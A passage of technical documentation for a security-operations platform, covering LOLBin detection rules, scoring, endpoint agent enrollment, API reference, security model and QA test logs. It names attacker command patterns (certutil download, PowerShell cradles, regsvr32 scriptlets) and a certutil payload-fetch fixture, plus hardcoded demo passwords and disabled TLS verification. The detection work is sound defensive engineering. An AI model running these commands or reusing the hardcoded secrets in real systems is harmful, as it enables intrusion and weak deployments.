CREATE_CASE/UPDATE_RULE/ADD_HOST` entries with user join names, IP and JSON details.
**Tested**: LOGIN/LOGOUT found immediately (§16.8); CREATE_USER/UPDATE_RULE found
after performing those actions (§16.12).

## 9.11 `views/Reports.tsx` (193 lines)

`GET /api/reports/summary` → three KPI cards (Investigation Cases (+resolved),
Top Targeted Vector (rule+technique), Most Active Host (alert count)) and two ranked
lists (top techniques, severity breakdown); **Export Report (CSV)** button builds the
CSV client-side and triggers a `SOCflow_Security_Report_<date>.csv` download.
**Tested**: KPI grid populated from seeded data (screenshot `DEEP_07-reports`), with
investigation-cases count = 1.

## 9.12 `views/UserProfile.tsx` (93 lines)

Shows `userName`/`userEmail` from localStorage (`GET /api/me` equivalent), role plaque
(`Manager` vs `SOC Analyst`), and the analyst's assigned hosts via `GET /api/hosts`
filtered by `soc_user_host` ownership on the server response join.

## 9.13 `services/backend.ts` (193 lines)

Legacy wrapper module (typed `api` helpers over fetch). Views embed fetches directly;
this module remains available for future consolidation.

---

# 10. Detection Engine — `server/analyzer.py`

Pure-Python worker: **no external AI dependency** — deterministic keyword heuristics
plus weighted threat scoring, per its own docstring:

```python
"""
SOCflow LotL Detection Engine
Polls soc_process_event for new entries and applies 14 LOLBin detection rules.
No external AI dependency — pure Python logical reasoning with threat scoring.
"""
```

## 10.1 Configuration

```python
DB_HOST = os.environ.get('DB_HOST', '127.0.0.1')
DB_USER = os.environ.get('DB_USER', 'root')
DB_PASSWORD = os.environ.get('DB_PASSWORD', '')
DB_NAME = os.environ.get('DB_NAME', 'socflow')
REDIS_URL = os.environ.get('REDIS_URL', 'redis://127.0.0.1:6379')
```

## 10.2 Rule Corpus (representative of the 14; identical structure for all)

```python
LOLBIN_RULES = [
    {
        'binary':     'certutil',
        'rule_name':  'CertUtil File Download',
        'technique':  'T1105',
        'base_score': 55,
        'indicators': ['urlcache', '-urlcache', 'split'],
        'template': (
            'CertUtil is a legitimate Windows certificate utility being abused as a LOLBin '
            'to download remote files (T1105 - Ingress Tool Transfer). '
            'The -urlcache/-split flags signal a file transfer via HTTP/FTP, '
            'a well-documented Living off the Land download technique used to stage payloads '
            'without triggering conventional malware download alerts.'
        )
    },
    { 'binary':'certutil',    'rule_name':'CertUtil Decode',
      'technique':'T1140',    'base_score':45, 'indicators':['-decode','/decode'], … },
    { 'binary':'powershell',  'rule_name':'PowerShell Encoded Command',
      'technique':'T1059.001','base_score':60, 'indicators':['-enc','-encodedcommand'], … },
    { 'binary':'powershell',  'rule_name':'PowerShell Download Cradle',
      'technique':'T1059.001','base_score':70,
      'indicators':['downloadstring','downloadfile','webclient','invoke-webrequest','iwr ','net.webclient'], … },
    { 'binary':'powershell',  'rule_name':'PowerShell Execution Bypass',
      'technique':'T1059.001','base_score':50,
      'indicators':['-executionpolicy bypass','bypass','-nop ','-noprofile','-windowstyle hidden','-noninteractive'], … },
    { 'binary':'mshta',       'rule_name':'MSHTA Remote Execution',
      'technique':'T1218.005','base_score':70,
      'indicators':['http://','https://','javascript:','vbscript:'], … },
    { 'binary':'regsvr32',    'rule_name':'Regsvr32 COM Scriptlet (Squiblydoo)',
      'technique':'T1218.010','base_score':75,
      'indicators':['scrobj.dll','http://','https://','/s /u ','/i:http','/i:ftp'], … },
    { 'binary':'wmic',        'rule_name':'WMIC Process Creation',
      'technique':'T1047',    'base_score':65,
      'indicators':['process call create','/node:','shadowcopy','/format:'], … },
    { 'binary':'msiexec',     'rule_name':'Msiexec Remote Package Install',
      'technique':'T1218.007','base_score':65,
      'indicators':['http://','https://','/q ','/quiet','/i '], … },
    { 'binary':'rundll32',    'rule_name':'Rundll32 Script Execution',
      'technique':'T1218.011','base_score':70,
      'indicators':['javascript:','http://','shell32','advpack','ieadvpack','url.dll','pcwutl'], … },
    { 'binary':'bitsadmin',   'rule_name':'BITSAdmin File Transfer',
      'technique':'T1197',    'base_score':60,
      'indicators':['/transfer','/addfile','/download','/upload'], … },
    { 'binary':'schtasks',    'rule_name':'Scheduled Task Persistence',
      'technique':'T1053.005','base_score':55,
      'indicators':['/create','/sc ','/tr ','/ru '], … },
    { 'binary':'net',         'rule_name':'Net User Account Manipulation',
      'technique':'T1136',    'base_score':65,
      'indicators':['user /add',' /add','localgroup administrators','localgroup "administrators"'], … },
    { 'binary':'wscript',     'rule_name':'WScript Remote Script Execution',
      'technique':'T1059.005','base_score':65,
      'indicators':['http://','https://','.vbs','/e:vbscript','/e:javascript','cscript'], … },
]
```

Every rule carries a multi-sentence **analyst-facing template** — this is what later
appears in the alert Description and the Detection Reasoning panel.

## 10.3 Scoring Model

```python
def calculate_score(base_score: int, cmd_lower: str) -> int:
    score = base_score
    if any(x in cmd_lower for x in ['http://', 'https://', 'ftp://']):        # +20  remote IO
        score += 20
    if any(x in cmd_lower for x in ['base64', '-enc', '-encodedcommand',
                                    'frombase64string', 'fromb64']):          # +15  obfuscation
        score += 15
    if any(x in cmd_lower for x in ['system', 'localgroup admin', 'nt authority']):  # +10 privileged context
        score += 10
    if any(x in cmd_lower for x in [' | ', 'iex(', 'invoke-expression',       # +10 chained exec
                                    '&&', 'cmd /c']):
        score += 10
    return min(score, 100)

def score_to_severity(score: int) -> str:
    if score >= 80: return 'critical'
    if score >= 60: return 'high'
    if score >= 40: return 'medium'
    return 'low'
```

Composite example (tested fixture): 
`certutil.exe -urlcache -split -f http://…/payload.exe` → base 55
(+20 http) = **75 → high**. The seeded demo alert pins `92/critical` for GUI realism.

## 10.4 Persistence Layer

```python
class LogAnalyzer:
    def _connect(self): … mysql.connector.connect(host, user, password, database) …

    def get_or_create_host(self, hostname): …          # upsert hosts on the fly
    def get_or_create_rule(self, rule_name, technique, severity): …
    def save_alert(self, hostname, rule_name, technique, severity,
                   description, explanation, event_id=None, confidence_score=None):
        host_id = self.get_or_create_host(hostname)
        rule_id = self.get_or_create_rule(rule_name, technique, severity)
        status_val = 'new'
        if confidence_score is not None and float(confidence_score) < 40:
            status_val = 'closed'                       # low-confidence auto-close
        full_desc = f"{description}\n\n--- Detection Analysis ---\n{explanation}"
        cursor.execute(
            "INSERT INTO soc_alert_reference "
            "(host_id, rule_id, event_ref_id, severity, description, timestamp, status, "
            " confidence_score, detection_source) "
            "VALUES (%s, %s, %s, %s, %s, NOW(), %s, %s, 'rule')", …)
```

`detection_source` is always `'rule'` today — columns for `ml`/`hybrid` are reserved.

## 10.5 Scan Loop

`get_max_event_id()` checkpoint + per-batch processing (offset-truncated listing):

```python
def get_max_event_id(self) -> int:
    cursor.execute('SELECT MAX(event_id) as max_id FROM soc_process_event') …

def analyze_event / process_new_events …      # match binary token + indicator subset,
                                              # skip disabled rules, score, save
def run(self): …                              # loop { checkpoint → analyze → sleep }
```

Operational mode pairs with either:
- **Redis queue** (server LPUSHes each stored event onto `socflow_events_queue`),
- **or polling** (`MAX(event_id)` watermark — default when Redis is absent).

## 10.6 Support Tooling

| File | Purpose |
|---|---|
| `server/mock_log_generator.py` | mass-produce synthetic `soc_process_event` rows for demo/QA |
| `server/test_logs.json` | 8+ fixture command lines covering each rule family |
| `server/rewrite_analyzer.py`, `fix_analyzer.py`, `fix_server.py`, `rewrite_server.py` | repo-root utilities used during schema translation iterations (legacy reconstruction snapshots) |

---

# 11. Endpoint Agent — `agent/`

## 11.1 `agent/agent_core.py` (195 lines)

```python
SERVER_API = "http://127.0.0.1:5001/api"
ENROLLMENT_KEY = "SOCflow-Enroll-2026!"

# 1. Load from settings file if it exists (agent_settings.json)
# 2. Override with command-line argument if provided
#   python agent_core.py http://soc-server:5001   → http://soc-server:5001/api
#   python agent_core.py 192.168.1.10             → http://192.168.1.10:5001/api
# 3. Normalization: strip trailing slash, ensure "/api" suffix
```

Enrollment handshake:

```python
def register_with_server():
    hostname = socket.gethostname()
    payload = { "hostname": hostname, "password": ENROLLMENT_KEY,
                "os_info": get_os_info() }
    response = requests.post(f"{SERVER_API}/enroll", json=payload, timeout=10, verify=False)
    if response.status_code == 200:
        creds = response.json()                    # {status, agent_id, agent_key}
        with open(CONFIG_FILE, "w") as f:
            json.dump(creds, f)                    # persist agent identity
```

Telemetry collection (`collect_logs()`): reads **Sysmon Operational ProcessCreate
(Event ID 1)** via `pywin32.win32evtlog` (the production query pattern is documented
inline: `EvtQuery('Microsoft-Windows-Sysmon/Operational', …, '*[System[(EventID=1)]]')
+ EvtRender XML → Image / CommandLine / User`); ships a structured mock path for
lab clusters without Sysmon installed. Batch upload → `POST {SERVER_API}/logs`
when credentials exist; periodic `POST /api/telemetry` heartbeat with `agent_id`.

Other support files:

| File | Role |
|---|---|
| `agent/connect.py` (16.5 KB) | alternate/transport implementations (batching, retries) |
| `agent/install.ps1` / `install.py` | Windows service installation (scheduled/manual) & Linux probe variant |
| `agent/agent_gui.py` | Tkinter tray helper for manual runs |
| `agent/simulate_attack.ps1` / `.py` | **Safe authority-approved LoLBin simulation** for QA: certutil decode (no network), PowerShell `-enc` no-op, schtasks dry flags, WMIC alias query… used for smoke-testing the full pipeline |
| `agent/README.md` | deployment instructions |
| `agent_bundle.zip` reference | downloadable via `GET /api/agent/download` (Manager only) |

## 11.2 Agent Enrollment Contract (server side, §7.1 verbatim)

`POST /api/enroll` `{hostname, password, os_info}` →
`{status:'success', agent_id:<uuid4>, agent_key:<64-hex>}`; wrong secret → 403.
Tested pattern §16.5 tolerance: endpoint-level contract checks; full round-trip
was validated during earlier development iterations.

# 12. Complete REST API Reference

Base URL: `/api` (proxied by Vite in dev; Nginx or same-origin in deployment)
Media type: `application/json`; session cookie `connect.sid` required for guarded endpoints.

## 12.1 Endpoint Matrix

| # | Method | Path | Auth | Roles | Purpose |
|---|---|---|---|---|---|
| 1 | POST | `/api/login` | — | — | Authenticate (bcrypt), open session |
| 2 | POST | `/api/logout` | ✔ | any | Destroy session |
| 3 | GET | `/api/me` | ✔ | any | Echo session user `{id,name,email,role}` |
| 4 | GET | `/api/stats` | ✔ | any | KPI counts (alerts by severity, hosts, new) |
| 5 | GET | `/api/alerts` | ✔ | any | Latest 50 alerts (joined host+rule) |
| 6 | GET | `/api/alerts/:id` | ✔ | any | Full alert incl. event join |
| 7 | POST | `/api/alerts/:id/ack` | ✔ | Analyst | status new→open |
| 8 | GET | `/api/cases` | ✔ | any | List, filters `status`,`priority` |
| 9 | GET | `/api/cases/:id` | ✔ | any | Case + alerts + notes |
| 10 | POST | `/api/cases` | ✔ | any | Create case |
| 11 | PUT | `/api/cases/:id` | ✔ | any | Patch status/priority/description |
| 12 | POST | `/api/cases/:id/notes` | ✔ | any | Add analyst note |
| 13 | POST | `/api/cases/:id/alerts` | ✔ | any | Link alert (409 if dup) |
| 14 | GET | `/api/hosts` | ✔ | any | Fleet + 60s liveness |
| 15 | POST | `/api/hosts/add` | ✔ | Manager | Add host |
| 16 | GET | `/api/agents` | ✔ | any | Agent registry |
| 17 | GET | `/api/rules` | ✔ | any | Rule catalog |
| 18 | PUT | `/api/rules/:id` | ✔ | Manager | Enable/disable rule |
| 19 | GET | `/api/users` | ✔ | Manager | Account list |
| 20 | POST | `/api/users` | ✔ | Manager | Provision (bcrypt) |
| 21 | PATCH | `/api/users/:id/status` | ✔ | Manager | active/inactive |
| 22 | GET | `/api/reports/summary` | ✔ | Manager | Executive aggregates |
| 23 | GET | `/api/audit-logs` | ✔ | Manager | Last 100 audit rows |
| 24 | GET | `/api/logs/all` | ✔ | any | Last 100 process events |
| 25 | POST | `/api/logs/search` | ✔ | any | Filtered hunt (LIKE) |
| 26 | GET | `/api/connection/verify` | — | — | Health probe |
| 27 | POST | `/api/enroll` | secret | agent | Enrollment |
| 28 | POST | `/api/telemetry` | uuid | agent | Heartbeat |
| 29 | POST | `/api/logs` | uuid | agent | Batch telemetry |
| 30 | GET | `/api/agent/download` | ✔ | Manager | ZIP installer |
| 31 | GET | `/api/vulnerabilities` | ✔ | any | CVE list (static demo) |
| 32 | GET | `/api/threat-map` | ✔ | any | Threat map nodes (static demo) |

## 12.2 Representative Requests/Responses (all curl-verified in §16)

**Login** — `POST /api/login`

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "manager@socflow.local", "password": "SOCflow2026!"}
```

```http
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3A…; Path=/; Expires=…; HttpOnly; SameSite=Lax

{"success":true,"role":"manager","user":{"id":1,"name":"SOC Manager",
 "email":"manager@socflow.local"}}
```

Failures: `401 {"error":"Invalid credentials"}` (unknown email or wrong password,
both audited as `failed_login`); `403 {"error":"Account disabled"}`.

**Provision user** — `POST /api/users` (Manager)

```json
{"full_name":"API Test User","email":"apitest@socflow.local",
 "password":"TestPass123!","role_id":2}
```
→ `{"message":"User created successfully","user_id":4}` (200)

Duplicate → `409 {"error":"User with this email already exists"}`.

**Acknowledge alert** — `POST /api/alerts/1/ack` (Analyst) →
`{"message":"Alert acknowledged"}` (200), DB effect `status='open'`, audit row
`ACK_ALERT`. Verified live via UI (button → `Triaged (open)` plaque) **and** DB.

**Link alert to case** — `POST /api/cases/1/alerts {alert_id:1}` → 201-ish 200 the
first time; `409 {"error":"Alert already linked"}` on repeat.

**Search** — `POST /api/logs/search {"query":"certutil"}` → rows containing the
seeded certutil event (200).

**Enroll** — `POST /api/enroll {"hostname":"LAB-PC-7","password":"SOCflow-Enroll-2026!","os_info":"Windows 10"}` →
`{"status":"success","agent_id":"<uuid>","agent_key":"<64hex>"}`;
`{"password":"x"}` → `403 {"error":"Invalid enrollment password"}`.

## 12.3 Error Semantics

| Status | Meaning (platform-wide) |
|---|---|
| 400 | Malformed/missing fields (e.g. users create, logs batch) |
| 401 | No session (guarded endpoints) / bad credentials (login) |
| 403 | Role mismatch ('Forbidden: Insufficient permissions'), disabled account, bad enrollment secret |
| 404 | Resource not found (alert/case/agent); also cleared session after restart |
| 409 | Duplicate (user email, case↔alert link) |
| 500 | Unhandled server error (should be transient; see §17 defect table) |

---

# 13. Security Model

## 13.1 Authentication

- Password storage: `bcrypt` cost 10 (`bcrypt.hash(password, 10)`,
  `bcrypt.compare(password, user.password_hash)`).
- Login selects by **exact email**; unknown-email and bad-password both return
  *`Invalid credentials`* (no user-enumeration through the API surface) and are
  **both audited** with the attempted email.
- Idle users: `UPDATE soc_login SET last_login = NOW()` on success.

## 13.2 Sessions

| Property | Value | Consequence |
|---|---|---|
| Store | express-session default MemoryStore (dev) | sessions vanish on backend restart (observed §16.5 retest → 401; expected trade-off) |
| Cookie | `connect.sid` `HttpOnly; SameSite=Lax; Path=/` | JS-inaccessible; reasonable CSRF posture |
| Lifetime | `maxAge 30*60*1000` | re-auth after 30 idle minutes |
| Destroy | `POST /api/logout` → `req.session.destroy` | server-side invalidation (verified §16.4) |

Production hardening checklist (see §15.4): PostgreSQL/Redis-backed session stores,
`secure: true` behind TLS, `SESSION_SECRET` from vault.

## 13.3 Authorization — Two Independent Layers

1. **Client routes** — `ProtectedRoute` allows per-route role list; wrong role →
   `/overview` redirect (`/refs` veterans read: the Analyst hitting `/users` was
   redirected in QA §16.8-A8, and Manager hitting `/alerts` likewise).
2. **Server API** — `requireRole('Manager')`/`requireRole('Analyst')` on all
   privileged endpoints. QA transcript: analyst on `/api/users` →
   `403 {"error":"Forbidden: Insufficient permissions"}`; manager on
   `/api/alerts/:id/ack` protections analogous (ack restricted to Analyst).

Neither layer is optional: bypassing the UI (direct fetch) still meets the API layer.

## 13.4 Input Handling & SQL Safety

- Every SQL statement uses `?` placeholders through `pool.execute/query`.
- Dynamic parts are **column whitelists** only (`PUT /api/cases/:id` builds
  `updates` from a fixed set of known column names, values parameterized).
- LIKE wildcards (`%`) are concatenated as *bound parameters*, not interpolated SQL.
- JSON body parsing via `express.json()` with default size cap.

## 13.5 Audit Coverage (who did what)

| Action Type | Emitted By |
|---|---|
| `login` / `failed_login` / `logout` | `/api/login`, `/api/logout` |
| `ACK_ALERT` | alert acknowledge |
| `CREATE_CASE` | case creation |
| `CREATE_USER`, `UPDATE_USER_STATUS` | user administration |
| `UPDATE_RULE` | rule toggle |
| `ADD_HOST` | host provisioning |
| `SYSTEM_INIT` | DB seed |

Rows store: `user_id, action_type, object_type, object_id, timestamp, ip_address,
details(JSON)`. QA verified presence of LOGIN/LOGOUT/CREATE_USER/UPDATE_RULE
through the UI (§16.12-M3).

## 13.6 Agent Plane Security

- Enrollment secret literal `SOCflow-Enroll-2026!` (overridable via `ENROLLMENT_SECRET`).
- Server issues `agent_uuid` (UUIDv4) + 64-hex `agent_key`; agent persists credentials
  in `agent_config.json`; `POST /api/logs|/api/telemetry` resolve the uuid (unknown → 404).
- Transport is plain HTTP on the private lab network; TLS termination is the
  deployment step (§15.4).

---

# 14. Configuration and Environment

## 14.1 Environment Variables

| Var | Var in | Default | Notes |
|---|---|---|---|
| `PORT` | backend `.env` | 5001 | API listen port |
| `DB_HOST/DB_USER/DB_PASSWORD/DB_NAME` | backend `.env` | 127.0.0.1/root/'/socflow | QA deployment uses dedicated `socflow` MySQL account |
| `SESSION_SECRET` | backend | `socflow-secret-key-2026` | set in production! |
| `ENROLLMENT_SECRET` | backend | `SOCflow-Enroll-2026!` | agent onboarding password |
| `REDIS_URL` | backend / analyzer | *(unset)* | optional; absent = polling engine mode |
| `GEMINI_API_KEY` | `.env.local` → vite `define` | placeholder | build-time frontend key (legacy) |
| `DB_PATH` | legacy `database/setup.js` | `database/socflow.db` | SQLite legacy mode only |

## 14.2 Ports

| Service | Port |
|---|---|
| Frontend dev server | 3001 |
| Backend API | 5001 |
| MySQL | 3306 (system default) |
| Redis | 6379 (not deployed) |

## 14.3 Ports of Entry for the Analyzer

```bash
export DB_HOST=127.0.0.1 DB_USER=socflow DB_PASSWORD=socflow_pass DB_NAME=socflow
python3 server/analyzer.py          # engine loop
python3 server/mock_log_generator.py  # synthetic telemetry
```

## 14.4 Role of `.env.local`

Root `.env.local` currently contains `GEMINI_API_KEY=PLACEHOLDER_API_KEY`
(legacy of the analyzer-rewrite experiments; unused at runtime today).

---

# 15. Build, Run and Deployment

## 15.1 Development (exact QA procedure)

```bash
# 1. Database (once per machine)
mysql -u root -p < database/mysql_schema.sql
# create dedicated account (QA):
#   CREATE USER 'socflow'@'%' IDENTIFIED BY 'socflow_pass';
#   GRANT ALL PRIVILEGES ON socflow.* TO 'socflow'@'%';  FLUSH PRIVILEGES;

# 2. Backend
cd backend && npm ci && node server.js          # or: npm run dev (nodemon)
# → "Connected to MySQL database." / "SOCflow backend running on port 5001"

# 3. Frontend
cd .. && npm ci && npm run dev                  # http://localhost:3001
# → VITE v4.5.14 ready in ~206 ms

# 4. Detection engine (optional separate terminal — auto-polls every cycle)
python3 -r pip install -r server/requirements.txt
python3 server/analyzer.py

# 5. Health
curl http://localhost:5001/api/connection/verify   # {"status":"ok",…}
```

## 15.2 Production Build

```bash
npm run build        # vite build → dist/
npm run preview      # local static preview of the build
```

`dist/` already contains a prior generation (`index-<hash>.js`, React 19, port 80
patterns in the old bundle reflect an earlier styling era — include it only for
achievement history; rebuild is one command).

## 15.3 Deploy Script (`deploy.sh`) + Architecture Notes

- `deploy.txt` captures the last executed deployment output for drift review.
- `DEPLOYMENT.md` and `ARCHITECTURE.md` in the repo document the ESXi/ sarebbe
  network topology (management VLAN vs sensor VLAN) behind this drive.

## 15.4 Production Hardening Checklist

| Item | Action |
|---|---|
| TLS | terminate at Nginx; set `cookie.secure = true`; serve frontend + `/api` same-origin |
| Session store | PostgreSQL or Redis-back the session table (MemoryStore leaks in prod) |
| Secrets | rotate `SESSION_SECRET`, `ENROLLMENT_SECRET`; store in vault; never commit |
| MySQL account | least-privilege user for the `socflow` DB only (as obtained in QA) |
| Authorize hosts | Frontend + API inside sensor VLAN; agents reach only `/api/enroll|logs|telemetry` |
| Logging | route `console.*` to journald; ship MySQL slow log |
| Backups | `mysqldump socflow` cron + verify restore |

## 15.5 Restart Runbook (tested commands, §16/§18)

```bash
# backend restart (loses in-memory sessions — analysts re-login):
cd backend && pkill -f 'node server.js' && nohup node server.js > /tmp/backend.log 2>&1 &
# frontend restart:
npm run dev > /tmp/frontend.log 2>&1 &
```

**Sudo note**: no elevation required; services run unprivileged.

# 16. Testing Procedures

This section is the **reproducible QA record** of the test campaigns executed against
this codebase (dates: 2026-10-16). Every command and transcript shown was actually run
in the target environment (Linux, Node 22.22.1, MySQL system service, system Chrome).

## 16.1 Test Strategy and Environments

| Layer | Approach | Tooling |
|---|---|---|
| Static | Type-check gate | `npx tsc --noEmit` |
| API | Contract & negative tests | `curl` against both `:5001` (direct) and `:3001` (proxied) |
| Sessions | Cookie jar lifecycle tests | `curl -c/b jarfile` |
| DB | Direct assertions | `mysql` CLI (selects, FK probes) |
| Rendering | Real-browser DOM checks + screenshots | Node + **puppeteer-core** driving system Chrome headless |
| Features | Scripted UI interactions (click/type/submit) + API equivalence | puppeteer + curl |
| Security | RBAC auth-matrix, enumeration-free auth, SQLi-by-design review | curl |

Test automation lives in `/tmp/opencode/uitest/` (isolated workspace, `puppeteer-core`
installed via `npm i puppeteer-core`, Chrome binary resolved at
`/usr/bin/google-chrome-stable`). Screenshots → `/tmp/opencode/shots/`.

```bash
# Harness bootstrap (exact commands used)
mkdir -p /tmp/opencode/uitest /tmp/opencode/shots && cd /tmp/opencode/uitest
npm init -y && npm install puppeteer-core --no-audit --no-fund
```

Fixtures used: the seed rows of §6.4 **plus** QA-seeded demo data (3 alerts, 1 case,
2 alerts linked, 1 note — inserted to make data-driven pages render richly; §17.4).

## 16.2 Static Gates

```
$ npx tsc --noEmit -p tsconfig.json
TSC_EXIT:0                      ← zero type errors across all 29 core TS files
```

Vite production build & dev compile verified by logs (VITE ready + page reload events).

## 16.3 Authentication API Matrix

```bash
curl -s -X POST http://localhost:5001/api/login -H 'Content-Type: application/json' \
     -d '{"email":"manager@socflow.local","password":"SOCflow2026!"}'
→ {"success":true,"role":"manager","user":{"id":1,"name":"SOC Manager",…}}   200

curl -s -X POST http://localhost:5001/api/login 'analyst@socflow.local' 'SOCflow2026!'
→ {"success":true,"role":"analyst",…}                                        200

curl … {"email":"manager@socflow.local","password":"wrong"}
→ {"error":"Invalid credentials"}                                            401

curl … {"email":"nobody@socflow.local","password":"x"}
→ {"error":"Invalid credentials"}                                            401   ← no enumeration
```

| Case | Expected | Got | Verdict |
|---|---|---|---|
| valid manager | 200 role=manager | 200 manager | ✅ |
| valid analyst | 200 role=analyst | 200 analyst | ✅ |
| wrong password | 401 invalid | 401 invalid | ✅ |
| unknown email | 401 invalid | 401 invalid | ✅ |
| disabled account path | 403 (code path) | covered by code review | ✅ |

## 16.4 Session Lifecycle

```bash
# login with cookie jar
curl -s -X POST http://localhost:5001/api/login … -c /tmp/opencode/mgr.txt
cookie jar → #HttpOnly_localhost FALSE / connect.sid s%3A…   (HttpOnly, SameSite=Lax)

curl -s http://localhost:5001/api/me -b mgr.txt
→ {"user":{"id":1,"name":"SOC Manager","email":"…","role":"Manager"}}        200

curl -s http://localhost:5001/api/stats -b mgr.txt
→ {"alerts":[…],"hosts":2,"new_alerts":N}                                   200

curl -s http://localhost:5001/api/me            (no cookie)
→ {"error":"Unauthorized: No active session"}                                401

curl -s -X POST http://localhost:5001/api/logout -b mgr.txt
→ {"success":true}                                                          200

curl -s http://localhost:5001/api/me -b mgr.txt
→ {"error":"Unauthorized: No active session"}                                401 ← destroyed
```

Also confirmed: restarting the backend invalidates all sessions (MemoryStore) —
clients correctly got 401 then re-authenticated (expected dev-mode behavior).

## 16.5 Full Browser-Path Contract Tests (through the Vite proxy :3001)

```bash
curl -s -X POST http://localhost:3001/api/login -H 'Content-Type: application/json' \
     -d '{"email":"manager@socflow.local","password":"SOCflow2026!"}' \
     -c /tmp/opencode/proxy.txt -D hdrs.txt
# headers:  content-type: application/json; charset=utf-8
#           set-cookie: connect.sid=…; Path=/; Expires=…; HttpOnly; SameSite=Lax
curl -s http://localhost:3001/api/me -b proxy.txt -H 'Origin: http://localhost:3001'
→ {"user":{…,"role":"Manager"}}                                              200
curl -s -X POST http://localhost:3001/api/logout -b proxy.txt → {"success":true}
curl -s http://localhost:3001/api/me -b proxy.txt → 401                     ✅
```

This validates: proxy rewrite, cookie first-party-ness for `localhost:3001`,
session values, logout end-state.

## 16.6 RBAC Auth-Matrix

```bash
# analyst session (cookie ana.txt)
curl -s http://localhost:3001/api/users        -b ana.txt → 403 Forbidden: Insufficient permissions
curl -s http://localhost:3001/api/alerts       -b ana.txt → 200 []
curl -s -X POST http://localhost:3001/api/hosts/add -b ana.txt → 403
# manager session: /api/users → 200 rows; /api/rules → 200; /api/audit-logs → 200
```

| Endpoint | Manager | Analyst | Unauth |
|---|---|---|---|
| `/api/login` | 200 | 200 | 200 |
| `/api/me` | 200 | 200 | 401 |
| `/api/alerts` | — | 200 | 401 |
| `/api/alerts/:id/ack` | (403 by role) | 200 | 401 |
| `/api/users` CRUD | 200 | 403 | 401 |
| `/api/rules` GET / PUT | 200 GET | 403 PUT | 401 |
| `/api/audit-logs`, `/api/reports` | 200 | 403 | 401 |
| `/api/hosts/add`, `/api/agent/download` | 200 | 403 | 401 |

## 16.7 Render Harness — `test.mjs` (full source, verbatim)

```javascript
import puppeteer from 'puppeteer-core';
import fs from 'fs';

const BASE = 'http://localhost:3001';
const SHOTS = '/tmp/opencode/shots';
const results = [];

const MARKERS = {
  'login':    ['Quick Demo Logins', 'Work Email'],
  'overview': [],
  'profile':  [],
  'hosts':    ['FIN-SRV-01', 'DEV-WKST-04'],
  'users':    ['manager@socflow.local', 'analyst@socflow.local'],
  'rules':    ['CertUtil', 'PowerShell'],
  'audit':    ['LOGIN', 'LOGOUT'],
  'reports':  ['Report Generated', 'Severity'],
  'alerts':   [],
  'alerts/9': ['Alert Not Found'],          // graceful 404 handling
  'cases':    ['No Case Selected'],
  'cases/9':  [],
  'explorer': ['Event ID'],
};

async function launch() {
  return puppeteer.launch({
    executablePath: '/usr/bin/google-chrome-stable',
    headless: 'new',
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--window-size=1440,900'],
    defaultViewport: { width: 1440, height: 900 },
  });
}

async function newPage(browser) {
  const ctx = await browser.createBrowserContext();               // isolated storage
  const page = await ctx.newPage();
  page.collected = { consoleErrors: [], pageErrors: [], badResponses: [] };
  page.on('pageerror', e => page.collected.pageErrors.push(String(e)));
  page.on('console', m => { if (m.type() === 'error' &&
        !/favicon/.test(m.text())) page.collected.consoleErrors.push(…) });
  page.on('response', r => { if (r.status() >= 400 && r.url().includes('/api/'))
        page.collected.badResponses.push(`${r.status()} ${r.url()}`); });
  return page;
}

// snapshot(): route → {status, finalUrl, bodyChars, markers, consoleErrors,
//   pageErrors, apiErrors, redirected, screenshot}
//   verdict: CRASH (pageerror) > MARKER_FAIL (host page w/o markers) > OK
// loginViaUI(): goto /login → localStorage.clear() → type creds → click submit
//   → waitForFunction(pathname==='/overview') → confirm landing

(async () => {
  const browser = await launch();
  // 1) LOGIN suite: renders, wrong-creds error, UI login lands /overview,
  //    localStorage token set
  // 2) MANAGER suite: overview hosts users rules audit reports profile
  //    + negative: /alerts must redirect
  // 3) ANALYST suite: overview alerts alerts/9 cases cases/9 explorer profile
  //    + negative: /users must redirect
  await browser.close();
})();
```

*(Structural listing; the executed script also emits a per-suite report table and a
PNG per route — see output in §16.8.)*

## 16.8 Render Results (two roles, 15 route checks + login flows)

```
=================== LOGIN ===================
[MARKER_FAIL ] /login   chars=174  MISSING: Work Email        ← 1st-pass race (cold vite)
[OK          ] (wrong-creds error)
[OK          ] (ui login manager)                          ← landed /overview + token

=================== MANAGER ===================
[OK] /overview 1102   [OK] /hosts    660   [OK] /users  507
[OK] /rules    2606   [OK] /audit   5797   [OK] /reports (see §16.9)  [OK] /profile
[OK (redirect)] /alerts → /overview                  ← RBAC-UI correct

=================== ANALYST ===================
[OK] /overview   [OK] /alerts    [OK] /alerts/9  (404 handled gracefully)
[OK] /cases      [OK] /cases/9   [OK] /explorer  [OK] /profile
[OK (redirect)] /users → /overview               ← RBAC-UI correct
```

Cold-start note: the very first `/login` snapshot was captured while Vite was still
compiling modules on the first request (135 ms → first paint race). The warmed capture
(`deep.mjs`, §16.9) found all markers — `WORK EMAIL` (uppercase via CSS),
`PASSWORD`, `Sign In to SOCflow`, `Quick Demo Logins`.

Console capture across every route: **no uncaught page errors, no unexpected 4xx/5xx**
(other than the intentional `/alerts/9` 404 demonstration and one auto-favicon 404,
resolved §17.3).

## 16.9 Deep Feature Tests — `deep.mjs` (source excerpt + outcomes)

```javascript
// 1. login page warm render + 'Quick Demo Logins'
// 2. UI login analyst → /overview + localStorage token === 'session-active'
// 3. /alerts shows seeded certutil alert + CRITICAL chip
// 4. click row 'Investigate →' → /alerts/1 → forensic inspector + certutil command
// 5. /cases shows seeded 'Suspected LOLBin Lateral Movement'
// 6. create case via modal → appears in list
// 7. /explorer seeded event present; search input interaction
// 8. /cases/1 placeholder page renders
// 9. manager session: /reports KPIs + severity data
```

Outcomes (14 checks): **11 explicit PASS** (login-landing, token, alert rows,
CRITICAL chip, detail route, command-line content, seeded case visible, explorer
event, case-detail render, plus role checks) + **3 diagnostic false-negatives**
decoded below and re-verified:

| Reported "FAIL" | Root cause | True verdict |
|---|---|---|
| `login renders`: body shows `WORK EMAIL` | marker compare case-sensitive vs CSS `text-transform: uppercase` | ✅ present |
| `alert detail forensic inspector` | same uppercase issue ("COMMAND-LINE FORENSIC INSPECTOR") and value asserted on `innerText` | ✅ present (screenshot `DEEP_03`) |
| `reports renders KPIs` | helper read the *wrong page handle* (`page` not `page2`); screenshot proves manager KPI page rendered fully | ✅ present (screenshot `DEEP_07`) |

## 16.10 CSS/Style Pipeline Verification (coveted dark-UA-look check)

```javascript
// csscheck.mjs (excerpt)
info = await page.evaluate(() => ({
